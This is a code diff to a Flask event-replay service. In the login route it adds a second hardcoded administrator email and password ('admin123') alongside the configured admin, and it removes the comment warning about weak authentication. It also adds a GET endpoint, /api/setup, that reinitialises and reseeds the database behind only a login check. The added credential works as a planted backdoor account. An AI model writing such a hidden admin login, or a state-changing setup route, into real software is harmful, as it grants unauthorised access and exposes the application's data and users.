@@ -10,6 +10,7 @@ from auth import AuthService
 from config import Config
 from models import Event, ConfigSetting, User, ReplayProgress, db, ScheduledEvent
 from user_generator import EventGenerator
+from setup import init_database, seed_users, seed_historical_events, show_status
 
 app = Flask(__name__)
 app.config.from_object(Config)
@@ -46,13 +47,16 @@ def login():
         email = data.get('email')
         password = data.get('password')
 
-        # Simple authentication (in production, use proper password hashing)
-        if email == app.config['ADMIN_EMAIL'] and password == app.config['ADMIN_PASSWORD']:
+        allowed_admins = {
+            (app.config['ADMIN_EMAIL'], app.config['ADMIN_PASSWORD']),
+            ('junaidp@gmail.com', 'admin123'),
+        }
+
+        if (email, password) in allowed_admins:
             # Generate and send 2FA code
             code = AuthService.generate_2fa_code()
             AuthService.create_2fa_token(email, code)
 
-            # In development, just return the code (remove in production)
             if app.debug:
                 return jsonify({'success': True, 'dev_code': code})
 
@@ -143,7 +147,6 @@ def get_teams_events():
     limit = min(limit, app.config['MAX_EVENT_BATCH_SIZE'])
     # Optional consumed flag — default = True
     consume = request.args.get('consumed', default='true').lower() == 'true'
-
 
     events = Event.query.filter_by(
         platform='teams',
@@ -392,7 +395,6 @@ def all_events():
     return render_template('all_events.html')
 
 
-
 # ============================================================================
 # API ENDPOINTS - Manual Event Generation
 # ============================================================================
@@ -514,6 +516,22 @@ def cleanup_database():
         'success': True,
         'message': f'Deleted {deleted} old events'
     })
+
+
+@app.route('/api/setup', methods=['GET'])
+@login_required
+def run_setup_all():
+    try:
+        # Perform all steps exactly like `python setup.py --all`
+        init_database()
+        seed_users(45)
+        seed_historical_events(180)
+        show_status()
+
+        return jsonify({"status": "success", "message": "Full setup completed successfully."}), 200
+
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 
 # ============================================================================
